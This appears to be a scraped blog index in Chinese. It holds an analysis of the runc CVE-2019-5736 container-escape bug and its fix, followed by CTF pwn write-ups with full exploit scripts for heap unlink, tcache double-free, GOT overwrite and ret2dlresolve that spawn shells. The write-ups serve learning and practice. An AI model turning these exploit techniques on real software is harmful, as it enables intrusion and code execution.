//传入配置参数，创建container对象 container, err := createContainer(context, id, spec) if err != nil { return -1, err } if notifySocket != nil { if err := notifySocket.setupSocketDirectory(); err != nil { return -1, err } if action == CT_ACT_RUN { if err := notifySocket.bindSocket(); err != nil { return -1, err } } } // Support on-demand socket activation by passing file descriptors into the container init process. listenFDs := []*os.File{} if os.Getenv(\"LISTEN_FDS\") != \"\" { listenFDs = activation.Files(false) } r := \u0026runner{ enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: !context.Bool(\"keep\"), container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(\"console-socket\"), detach: context.Bool(\"detach\"), pidFile: context.String(\"pid-file\"), preserveFDs: context.Int(\"preserve-fds\"), action: action, criuOpts: criuOpts, init: true, } return r.run(spec.Process) } r.run()对应于定义在utils_linux.go中的run()。之前传入的action值为CT_ACT_RUN，因此这里将会执行r.container.Run(process)。 //runc run命令对应的action Action: func(context *cli.Context) error { ... //传入action参数为CT_ACT_RUN status, err := startContainer(context, CT_ACT_RUN, nil) ... func (r *runner) run(config *specs.Process) (int, error) { ... //根据config创建process process, err := newProcess(*config) if err != nil { return -1, err } process.LogLevel = strconv.Itoa(int(logrus.GetLevel())) // Populate the fields that come from runner. process.Init = r.init //r.init为 true ... //r.action此时为CT_ACT_RUN switch r.action { case CT_ACT_CREATE: err = r.container.Start(process) case CT_ACT_RESTORE: err = r.container.Restore(process, r.criuOpts) case CT_ACT_RUN: //调用该方法 err = r.container.Run(process) default: panic(\"Unknown action\") } ... } r.container由createContainer()函数创建，根据createContainer()-loadFactory()-factory.Create()的调用链可知，r.container最终是由LinuxFactory.Create()所创建。所以r.container.Run()将会调用LinuxContainer.Run()，Run()包含了整个容器的启动逻辑。 func (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) { ... c := \u0026linuxContainer{ id: id, //容器id root: containerRoot, config: config, initPath: l.InitPath, initArgs: l.InitArgs, criuPath: l.CriuPath, newuidmapPath: l.NewuidmapPath, newgidmapPath: l.NewgidmapPath, cgroupManager: l.NewCgroupsManager(config.Cgroups, nil), } if l.NewIntelRdtManager != nil { c.intelRdtManager = l.NewIntelRdtManager(config, id, \"\") } c.state = \u0026stoppedState{c: c} return c, nil } func (c *linuxContainer) Run(process *Process) error { if err := c.Start(process); err != nil { return err } if process.Init { return c.exec() } return nil } Run()的调用链为linuxContainer.Run()-linuxContainer.Start()-linuxContainer.start()。Run()/Start()都是封装的linuxContainer导出函数，而真正的执行过程在start()中。 start()函数调用newParentProcess()创建父进程对象parent，并调用parent.start()启动子进程。 func (c *linuxContainer) start(process ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:2:1","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)漏洞分析-第三版","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#runc启动容器的过程"},{"categories":["源码阅读"],"content":"具体代码分析 runc启动容器的过程 runc run对应的command在run.go中被定义 // default action is to start a container var runCommand = cli.Command{ Name: \"run\", Usage: \"create and run a container\", ... Action: func(context *cli.Context) error { if err := checkArgs(context, 1, exactArgs); err != nil { return err } status, err := startContainer(context, CT_ACT_RUN, nil) if err == nil { // exit with the container's exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) } return fmt.Errorf(\"runc run failed: %w\", err) }, } 对应的Action会执行startContainer()函数。该函数会读取容器配置文件config.json的信息，生成spec对象，再将其作为参数通过createContainer()生成container对象。通过包含container对象的runner对象调用r.run()启动容器。 func startContainer(context *cli.Context, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) { if err := revisePidFile(context); err != nil { return -1, err } //读取配置文件，获取配置信息 spec, err := setupSpec(context) if err != nil { return -1, err } id := context.Args().First() if id == \"\" { return -1, errEmptyID } notifySocket := newNotifySocket(context, os.Getenv(\"NOTIFY_SOCKET\"), id) if notifySocket != nil { if err := notifySocket.setupSpec(context, spec); err != nil { return -1, err } } //传入配置参数，创建container对象 container, err := createContainer(context, id, spec) if err != nil { return -1, err } if notifySocket != nil { if err := notifySocket.setupSocketDirectory(); err != nil { return -1, err } if action == CT_ACT_RUN { if err := notifySocket.bindSocket(); err != nil { return -1, err } } } // Support on-demand socket activation by passing file descriptors into the container init process. listenFDs := []*os.File{} if os.Getenv(\"LISTEN_FDS\") != \"\" { listenFDs = activation.Files(false) } r := \u0026runner{ enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: !context.Bool(\"keep\"), container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(\"console-socket\"), detach: context.Bool(\"detach\"), pidFile: context.String(\"pid-file\"), preserveFDs: context.Int(\"preserve-fds\"), action: action, criuOpts: criuOpts, init: true, } return r.run(spec.Process) } r.run()对应于定义在utils_linux.go中的run()。之前传入的action值为CT_ACT_RUN，因此这里将会执行r.container.Run(process)。 //runc run命令对应的action Action: func(context *cli.Context) error { ... //传入action参数为CT_ACT_RUN status, err := startContainer(context, CT_ACT_RUN, nil) ... func (r *runner) run(config *specs.Process) (int, error) { ... //根据config创建process process, err := newProcess(*config) if err != nil { return -1, err } process.LogLevel = strconv.Itoa(int(logrus.GetLevel())) // Populate the fields that come from runner. process.Init = r.init //r.init为 true ... //r.action此时为CT_ACT_RUN switch r.action { case CT_ACT_CREATE: err = r.container.Start(process) case CT_ACT_RESTORE: err = r.container.Restore(process, r.criuOpts) case CT_ACT_RUN: //调用该方法 err = r.container.Run(process) default: panic(\"Unknown action\") } ... } r.container由createContainer()函数创建，根据createContainer()-loadFactory()-factory.Create()的调用链可知，r.container最终是由LinuxFactory.Create()所创建。所以r.container.Run()将会调用LinuxContainer.Run()，Run()包含了整个容器的启动逻辑。 func (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) { ... c := \u0026linuxContainer{ id: id, //容器id root: containerRoot, config: config, initPath: l.InitPath, initArgs: l.InitArgs, criuPath: l.CriuPath, newuidmapPath: l.NewuidmapPath, newgidmapPath: l.NewgidmapPath, cgroupManager: l.NewCgroupsManager(config.Cgroups, nil), } if l.NewIntelRdtManager != nil { c.intelRdtManager = l.NewIntelRdtManager(config, id, \"\") } c.state = \u0026stoppedState{c: c} return c, nil } func (c *linuxContainer) Run(process *Process) error { if err := c.Start(process); err != nil { return err } if process.Init { return c.exec() } return nil } Run()的调用链为linuxContainer.Run()-linuxContainer.Start()-linuxContainer.start()。Run()/Start()都是封装的linuxContainer导出函数，而真正的执行过程在start()中。 start()函数调用newParentProcess()创建父进程对象parent，并调用parent.start()启动子进程。 func (c *linuxContainer) start(process ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:2:1","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)漏洞分析-第三版","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#poc代码"},{"categories":["源码阅读"],"content":"漏洞修复 runc团队在1.0.0-rc7的版本中增加了该漏洞的补丁，修复漏洞的方式是在runc init进程进入到容器命名空间之前，先将/proc/self/exe（即宿主机上的runc）复制到内存中，然后用复制产生的匿名文件替换当前被执行文件的句柄，这样就能够防止将宿主机的runc文件暴露给容器内部的进程。 void nsexec(void) { ... /* * We need to re-exec if we are not in a cloned binary. This is necessary * to ensure that containers won't be able to access the host binary * through /proc/self/exe. See CVE-2019-5736. */ if (ensure_cloned_binary() \u003c 0) bail(\"could not ensure we are a cloned binary\"); ... } int ensure_cloned_binary(void) { int execfd; char **argv = NULL; /* Check that we're not self-cloned, and if we are then bail. */ int cloned = is_self_cloned(); if (cloned \u003e 0 || cloned == -ENOTRECOVERABLE) return cloned; if (fetchve(\u0026argv) \u003c 0) return -EINVAL; //复制匿名文件 execfd = clone_binary(); if (execfd \u003c 0) return -EIO; if (putenv(CLONED_BINARY_ENV \"=1\")) goto error; //执行该复制的匿名文件 fexecve(execfd, argv, environ); error: close(execfd); return -ENOEXEC; } ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:3:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)漏洞分析-第三版","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#漏洞修复"},{"categories":["源码阅读"],"content":"修补建议 更新docker，使用最新版本的runc 执行docker exec命令启动容器时，开启SELinux选项，限制容器内部进程可访问的资源 设置宿主机上的runc二进制文件为只读 尽量避免给予容器用户容器内部的root权限 ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:4:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)漏洞分析-第三版","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#修补建议"},{"categories":["源码阅读"],"content":"PS 这里还有另一个点想记一下。我一开始总想，既然进入pid命名空间之后，就可以通过/proc/看到，那为什么不直接在runc init进程的esexec()函数执行完之后就开始进行poc里面的攻击操作呢。后来我经过查找资料发现，确实有别的博客说过这个问题，并且说明其实在更早期的runc版本中，就是存在这一漏洞的。攻击者确实可以在runc init进入命名空间之后尝试修改宿主机上的runc文件，这一问题也被分发了一个cve，编号为CVE-2016-9962。但是由于nsexec()与最后的system.Exec()进程替换之间的时间窗格较小，所以攻击难度较大，该漏洞的严重程度也并没有那么的高。 From: Aleksa Sarai runC passes a file descriptor from the host’s filesystem to the “runc init” bootstrap process when joining a container. This allows a malicious process inside a container to gain access to the host filesystem with its current privilege set. Due to the race window between join-and-execve being quite small, this bug is quite hard to exploit. A similar, though mostly unrelated, exploit was discovered in LXC[1]. ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:5:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)漏洞分析-第三版","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#ps"},{"categories":["源码阅读"],"content":"往期回顾 docker-runc(CVE-2019-5736)漏洞分析 docker-runc(CVE-2019-5736)漏洞分析-第二版 ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:6:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)漏洞分析-第三版","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#往期回顾"},{"categories":["CTF"],"content":"0x00 前言 零零散散地看了两三天时间才把堆的一些基础内容与一道题看懂😑 ","date":"2021-09-06","objectID":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["CTF","pwn","堆"],"title":"pwn初学者的进阶（三）：堆学习","uri":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/#0x00-前言"},{"categories":["CTF"],"content":"0x01 picoctf_2018_are you root 题目链接 感天动地，我居然自己做出了一道堆题，虽然这题非常简单。 这题好像跟堆的机制也没啥大关系… 每次login的时候，chunk布局如下所示（假设输入用户名长度\u003c=0x18）： ------------------ | | 0x21 | allocated ----------------- |str_ptr| level | ------------------ | | 0x21 | allocated ----------------- | str content.. | ------------------ top chunk 这题的漏洞点在于，malloc与free的次数不匹配。程序中写入用户名时使用了strdup，**这个函数是隐含着malloc的调用的，而reset时又只进行了一次free调用。所以，正常的一次login与reset操作之后，chunk与fastbin的情况为： ------------------ | | 0x21 | allocated ----------------- |str_ptr| level | ------------------ | | 0x21 | free ----------------- | str content.. | ------------------ top chunk =================== fastbin: -\u003e ----------------- | | 0x21 | ----------------- | str content.. | ------------------ 所以这时再进行login，得到的就是写入了用户名内容的chunk，这是我们可控的。而代表auth-level的值就位于ptr+0x8，我们只要在第一次login的时候，把该处内容写为\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00，然后reset，再login即可。 exp from pwn import * context(os = 'linux', arch = 'amd64') # context.log_level = 'debug' p = remote('node4.buuoj.cn', 29378) def get_flag(): p.recvuntil(b'Enter your command:\\n\u003e ') p.sendline(b'get-flag') def login(content: bytes): p.recvuntil(b'Enter your command:\\n\u003e ') p.sendline(b'login ' + content) def reset(): p.recvuntil(b'Enter your command:\\n\u003e ') p.sendline(b'reset') payload = b'a'*0x8 + b'\\x05'.ljust(8, b'\\x00') login(payload) reset() login(b'test') get_flag() p.interactive() flag截图image-20210906144421764 \" flag截图 ps: #define DWORD __uint32_t，所以DWORD在x86/x64都是4字节大小，而不是字面意思的2倍字长。 ","date":"2021-09-06","objectID":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["CTF","pwn","堆"],"title":"pwn初学者的进阶（三）：堆学习","uri":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/#0x01-picoctf_2018_are-you-root"},{"categories":["CTF"],"content":"0x02 hitcon2014_stkof 题目链接 libc version: Ubuntu GLIBC 2.23-0ubuntu10 堆溢出，unlink利用。能够实现修改某个地址addr处的值为addr-0x18，在本题中则是修改记录chunk信息的heapArray数组中的值，实现heapArray[2] = \u0026heapArray[2]-0x8。 如果对于2.23版本中unlink的内容不太记得了，可以去翻一下ctf-wiki。 from pwn import * context.os = 'linux' context.arch = 'amd64' context.log_level = 'debug' context.terminal = [\"tmux\",\"splitw\",\"-h\"] # p = remote('') if args.LOCAL: # 本地用2.23libc调试 ld_path = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so' libc_path = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so' # libc_path = './libc.so.6' p = process([ld_path, './stkof'], env = {'LD_PRELOAD': libc_path}) gdb.attach(p) else: libc_path = './libc.so.6' p = remote('node4.buuoj.cn', 26958) def add(size: int): p.sendline(b'1') p.sendline(str(size).encode()) p.recvuntil(b'OK\\n') def edit(index: int, size: int, content: bytes): p.sendline(b'2') p.sendline(str(index).encode()) p.sendline(str(size).encode()) assert len(content) == size, \"make sure you entered the correct input\" p.send(content) def delete(index: int): p.sendline(b'3') p.sendline(str(index).encode()) def show(index: int): p.sendline(b'4') p.sendline(str(index).encode()) s_addr = 0x602140 libc = ELF(libc_path) e = ELF('./stkof') # 程序在调用fgets和printf之前没用执行setbuf操作，所以第一次调用fgets和printf的时候，这两个函数会申请chunk。 # 导致第一个申请的堆块与其它堆块不连续。 add(0x1000) # idx 1 # 申请3个连续的堆块 add(0x90) # idx 2 add(0x80) # idx 3 add(0x10) # idx 4 # 通过堆溢出改写chunk3的prev_inuse位，并且构造fake chunk # fake chunk的fd-\u003ebk和bk-\u003efd指向s[2] payload1 = b'a'*8 + p64(0x91) payload1 += p64(s_addr-8) + p64(s_addr) payload1 = payload1.ljust(0x90, b'a') payload1 += p64(0x90) + p64(0x90) edit(2, len(payload1), payload1) # free chunk3，触发对于chun2的unlink操作，改写s[2]内容为\u0026s[2]-0x18 delete(3) # 修改s数组内容 payload2 = b'a'*8 payload2 += p64(e.got['strlen']) # s[0] payload2 += p64(e.got['free']) # s[1] edit(2, len(payload2), payload2) # 修改strlen@got为puts@plt edit(0, 8, p64(e.plt['puts'])) # 泄露free@got内容 show(1) # 计算libc基址 free_address = u64(p.recvuntil(b'\\x7f')[-6:]+b'\\x00'*2) libc_base = free_address - libc.sym['free'] system_addr = libc_base + libc.sym['system'] # 修改free@got edit(1, 8, p64(system_addr)) # 写入 \"/bin/sh\"，执行system(\"/bin/sh\") edit(4, 8, b'/bin/sh\\x00') delete(4) p.interactive() ","date":"2021-09-06","objectID":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/:3:0","series":null,"tags":["CTF","pwn","堆"],"title":"pwn初学者的进阶（三）：堆学习","uri":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/#0x02-hitcon2014_stkof"},{"categories":["CTF"],"content":"0x03 npuctf_2020_easyheap 题目链接 libc version: Ubuntu GLIBC 2.27-3ubuntu1 2.27，off-by-one导致堆块重叠。free之后再分配可以使得分配的堆块重叠，从而造成覆盖指针。接着就是泄露libc＋改got表。 from pwn import * context(log_level = \"debug\") context(os=\"linux\", arch=\"amd64\") if args.REMOTE: p = remote('node4.buuoj.cn', 29292) else: context.terminal = [\"tmux\",\"splitw\",\"-h\"] p = process('./npuctf_2020_easyheap') gdb.attach(p) def create(size: int, content: bytes): assert size == 0x18 or size == 0x38, \"wrong size\" p.sendlineafter(b'Your choice :', b'1') p.sendlineafter(b'Size of Heap(0x10 or 0x20 only) :', str(size).encode()) p.sendafter(b'Content:', content) def edit(index: int, content: bytes): p.sendlineafter(b'Your choice :', b'2') p.sendlineafter(b'Index :', str(index).encode()) p.sendafter(b'Content: ', content) def show(index: int): p.sendlineafter(b'Your choice :', b'3') p.sendlineafter(b'Index :', str(index).encode()) def delete(index: int): p.sendlineafter(b'Your choice :', b'4') p.sendlineafter(b'Index :', str(index).encode()) e = ELF('./npuctf_2020_easyheap') libc = ELF('./libc6_2.27-3ubuntu1_amd64.so') # 下面这个glibc-all-in-one的libc2.27不对，可能是版本高了一点。 # libc = ELF('/home/leo/tools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so') # print(hex(libc.sym['free'])) # 通过覆盖size域来实现堆块重叠，再delete，然后malloc(0x38)和malloc(0x10)就会造成数据堆块与管理堆块重叠。 # 接着就可以控制管理堆块上记录的指针，实现got表地址的读取与修改 create(0x18, b'/bin/sh\\x00') # id0 create(0x18, b'a'*8) # id1 # overlap chunk edit(0, b'/bin/sh\\x00'+b'a'*0x10 + b'\\x41') # chunk被放入tcache bin时，系统不会将其下一个chunk的prev_inuse清0，所以这里不用担心最后的chunk被free之后与top chunk合并 delete(1) create(0x38, b'c'*8) # id1 edit(1, b'c'*0x18 + p64(0x21) + p64(0x38) + p64(e.got['free'])) # leak libc show(1) free_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\00')) libc_base = free_addr - libc.sym['free'] p.success(hex(libc_base)) system_addr = libc_base + libc.sym['system'] # modify free@got edit(1, p64(system_addr)) delete(0) p.interactive() ","date":"2021-09-06","objectID":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/:4:0","series":null,"tags":["CTF","pwn","堆"],"title":"pwn初学者的进阶（三）：堆学习","uri":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/#0x03-npuctf_2020_easyheap"},{"categories":["CTF"],"content":"0x04 ciscn_2019_final_3 题目链接 libc version: Ubuntu GLIBC 2.27-3ubuntu1 新类型，之前没做过。 2.27的tcache bin在程序未置零free之后的指针时是可以double free的，2.28才加入了key来防止double free。而double free可以造成tcache dup，接着可以任意地址malloc。 这题就是利用该操作，通过任意地址malloc改写chunk的size，使其free的时候进入到unsorted bin，然后泄露libc。接着改写malloc_hook为one gadget。 from pwn import * ''' ❯ one_gadget ./libc.so.6 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL 0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' context(os = \"linux\", arch = \"amd64\") context(log_level = \"debug\") libc = ELF('./libc.so.6') if args.REMOTE: p = remote('node4.buuoj.cn', 27792) else: context.terminal = [\"tmux\", \"splitw\", \"-h\"] p = process('./ciscn_final_3', env={'LD_PERLOAD': './libc.so.6'}) gdb.attach(p) def add(index: int, size: int, content: bytes): p.sendlineafter(b'choice \u003e ', b'1') p.sendlineafter(b'index\\n', str(index).encode()) p.sendlineafter(b'size\\n', str(size).encode()) p.sendlineafter(b'something\\n', content) p.recvuntil(b'gift :') return int(p.recv(14).decode(), 16) def remove(index: int): p.sendlineafter(b'choice \u003e ', b'2') p.sendlineafter(b'index\\n', str(index).encode()) heap = add(0, 0x78, b'a') #0 # p.info(\"heap: \"+hex(heap)) add(1, 0x18, b'b') #1 add(2, 0x78, b'c') #2 add(3, 0x78, b'd') #3 add(4, 0x78, b'c') #4 add(5, 0x78, b'd') #5 add(6, 0x78, b'c') #6 add(7, 0x78, b'd') #7 add(8, 0x78, b'c') #8 # ======= 0x421 chunk to here ======== add(9, 0x78, b'd') #9 add(10, 0x78, b'c') #10 add(11, 0x78, b'd') #11 add(12, 0x28, b'd') #12 # double free, create tcache dup remove(12) remove(12) add(13, 0x28, p64(heap-0x10)) # tcache bin won't check the size of the chunk. so we don't have to find the '0x7f' or other value in memory add(14, 0x28, p64(heap-0x10)) # make overlap, modify the size of chunk 0 to 0x420 add(15, 0x28, p64(0) + p64(0x421)) remove(0) # send chunk 0 to unsorted bin remove(1) # send chunk 1 to tcache bin add(16, 0x78, b'a') # move main_arena pointer to chunk 1 add(17, 0x18, b'a') main_arena = add(18, 0x18, b'a') - 0x60 malloc_hook = main_arena - 0x10 libc_base = malloc_hook - libc.sym['__malloc_hook'] one_gadget = libc_base + 0x10a38c # 0x4f322 不行 p.success(\"got libc base: \"+hex(libc_base)) p.success(\"cal onegadget: \"+hex(one_gadget)) # dup again remove(5) remove(5) add(19, 0x78, p64(malloc_hook)) add(20, 0x78, p64(malloc_hook)) add(21, 0x78, p64(one_gadget)) # trigger malloc \u0026 get shell p.sendlineafter(b'choice \u003e ', b'1') p.sendlineafter(b'index\\n', b'22') p.sendlineafter(b'size\\n', b'0') p.interactive() ","date":"2021-09-06","objectID":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/:5:0","series":null,"tags":["CTF","pwn","堆"],"title":"pwn初学者的进阶（三）：堆学习","uri":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/#0x04-ciscn_2019_final_3"},{"categories":["CTF"],"content":"花了一个上午时间，看了一下ret2dlresolve的基本原理与基本的利用过程。觉得步骤与相关细节要素还是蛮多的，为防止今后某一天再用到的时候忘得干干净净，特此记录一些我个人的理解，加深印象。 ","date":"2021-09-02","objectID":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:0:0","series":null,"tags":["CTF","pwn","栈"],"title":"pwn初学者的进阶（二）：ret2dlresolve学习记录","uri":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#"},{"categories":["CTF"],"content":"0x00 dlresolve原理 以下内容是32位x86平台相关，64位的ret2dlresolve我还没看。 这一部分内容需要记住的就是符号解析的过程，也是dlresolve执行的过程，同时也是ret2dlresolve生效的核心原理。 在符号解析过程中，有三种数据结构：ELF32_Rel、ELF32_sym、.dynstr中的字符串，分别位于.rel.plt、.dynsym、.dynstr节（section），查看这些节的命令为 readelf -S elf_name 在程序第一次调用某个函数时，关于plt处指令以及push操作什么的就不细说了，我认为整个流程大致可以这么理解： func@plt处的指令相当于先push一个offset值，然后调用plt[0]处的指令，这条指令相当于执行_dl_runtime_resolve(link_map_obj, reloc_index)，这里的reloc_index就是前面func@pltpush的offset 接下来就是三步走了，从函数原型_dl_runtime_resolve(link_map_obj, reloc_index)出发，根据reloc_index（相对于.rel.plt的字节偏移量，单位：字节）找到.rel.plt中的ELF32_Rel对象（大小为8字节），其中记录了一个r_info 再根据r_info（相对于.dynsym的索引，单位：0x10字节）找到.dynsym中的ELF32_sym类型对象（大小为0x10字节） 再根据ELF32_sym中的st_name字段（相对于.synstr的字节偏移量，单位：字节），找到.dynstr中的字符串，也就是函数名（正常执行流程是这样的），然后dlresolve从libc中查找，再计算实际地址，将其填入ELF32_Rel对象中的r_offset字段… 整个流程概括起来就是，func@plt给_dl_runtime_resolve传参数，_dl_runtime_resolve根据其参数去查询上面的那几个表获取函数名称，然后对libc进行解析，获取实际地址，写入got表。 ","date":"2021-09-02","objectID":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["CTF","pwn","栈"],"title":"pwn初学者的进阶（二）：ret2dlresolve学习记录","uri":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#0x00-dlresolve原理"},{"categories":["CTF"],"content":"0x01 攻击方法 感觉很多题都可以栈迁移，再加上如果.bss段可写的话，我们就可以控制将函数栈迁移到自己构造的栈上。 于是，最常规的攻击步骤就是： 栈迁移，然后调用plt[0]处指令 控制栈上的参数（对于_dl_runtime_resolve而言），以及想要调用的函数的参数（比如system） 再在栈上构造对应该参数的ELF32_Rel类型对象 再在栈上构造对应ELF32_Rel中r_info的ELF32_sym类型对象 再在栈上构造对应于ELF32_sym中st_name的字符串 所以一个典型的exp为： from pwn import * elf = ELF('./parelro_x86') offset = 112 read_plt = elf.plt['read'] ppp_ret = 0x08048619 # ROPgadget --binary bof --only \"pop|ret\" pop_ebp_ret = 0x0804861b # ROPgadget --binary parelro_x86 | grep 'pop ebp ; ret' leave_ret = 0x08048458 # ROPgadget --binary bof --only \"leave|ret\" stack_size = 0x800 bss_addr = 0x0804a040 # readelf -S bof | grep \".bss\" plt_0 = 0x08048380 # objdump -d -j .plt bof 执行 \u003cpush link_map，jmp dl_resolve\u003e rel_plt = 0x08048330 # objdump -s -j .rel.plt bof # 栈迁移的目的地 base_stage = bss_addr + stack_size index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移 write_got = elf.got['write'] dynsym = 0x080481d8 dynstr = 0x08048278 # fake_sym_addr 地址按照0x10字节对齐 fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) \u0026 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小 fake_sym_addr = fake_sym_addr + align index_dynsym = (fake_sym_addr - dynsym) // 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号 r_info = (index_dynsym \u003c\u003c 8) | 0x7 # 要满足：ELFW(R_TYPE)(reloc-\u003er_info) == ELF_MACHINE_JMP_SLOT，即最低字节要为7 fake_reloc = p32(write_got) + p32(r_info) st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10 fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12) r = process('./parelro_x86') r.recvuntil('Welcome to XDCTF2015~!\\n') payload = b'A' * offset payload += p32(read_plt) # 读100个字节到base_stage payload += p32(ppp_ret) payload += p32(0) payload += p32(base_stage) payload += p32(100) payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中 payload += p32(base_stage) payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage r.sendline(payload) cmd = b\"/bin/sh\" # stage3: # 栈迁移，调plt[0]，传入伪造的 index_offset，指向我们自定义的.rel.plt表项内容 # 并且控制r_info，指向我们伪造的.dynsym表项；再控制.dynsym表项中的st_name，指向我们控制的.dynstr表项内容 # --------\u003e base_stage payload2 = b'AAAA' payload2 += p32(plt_0) payload2 += p32(index_offset) payload2 += b'AAAA' payload2 += p32(base_stage + 80) # 对应system('/bin/sh') payload2 += p32(0xdeadbeef) # 后面的2个参数不需要了 payload2 += p32(0xdeadbeef) # (base_stage+28)的位置 payload2 += fake_reloc # (base_stage+36)的位置 payload2 += b'B' * align # (fake_sym_addr)的位置 payload2 += fake_sym payload2 += b\"system\\x00\" payload2 += b'A' * (80 - len(payload2)) # base_stage + 80 payload2 += cmd + b'\\x00' payload2 += b'A' * (100 - len(payload2)) # payload2结束，刚好100字节 r.sendline(payload2) r.interactive() 写一遍下来，感觉在没有完完全全弄透彻的情况下，通过文字描述清晰还是比较难的，但也只能先这样了😶 ","date":"2021-09-02","objectID":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["CTF","pwn","栈"],"title":"pwn初学者的进阶（二）：ret2dlresolve学习记录","uri":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#0x01-攻击方法"},{"categories":["CTF"],"content":"参考链接： 《ctf竞赛权威指南(pwn篇)》–$10.6:ret2dl-resolve Return-to-dl-resolve （复现平台：ubuntu16） CTF Wiki: 